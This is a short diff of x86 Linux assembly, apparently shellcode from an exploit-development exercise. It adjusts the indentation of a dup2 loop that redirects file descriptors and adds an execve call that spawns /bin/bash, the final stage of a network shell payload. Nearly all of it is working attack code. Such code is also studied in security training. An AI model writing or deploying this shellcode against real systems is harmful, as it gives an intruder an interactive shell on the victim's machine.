@@ -137,13 +137,28 @@ _start:
 dup2_loop:
 
 	; EAX dup2 syscall
-    mov al, 0x3f 
-    int 0x80
+    	mov al, 0x3f 
+   	int 0x80
     
-    dec cl
-    jns dup2_loop
+    	dec cl
+    	jns dup2_loop
 
 	;-------------------------------------------------------	
 	; 6) SPAWN SHELL
 	;-------------------------------------------------------
 	
+	xor eax,eax
+	push eax
+	push 0x68736162 ;/bin/bash
+	push 0x2f6e6962
+	push 0x2f2f2f2f	
+	mov ebx,esp
+
+	push eax
+	mov edx,esp
+
+	push ebx
+	mov ecx,esp
+
+	mov al,11
+	int 0x80
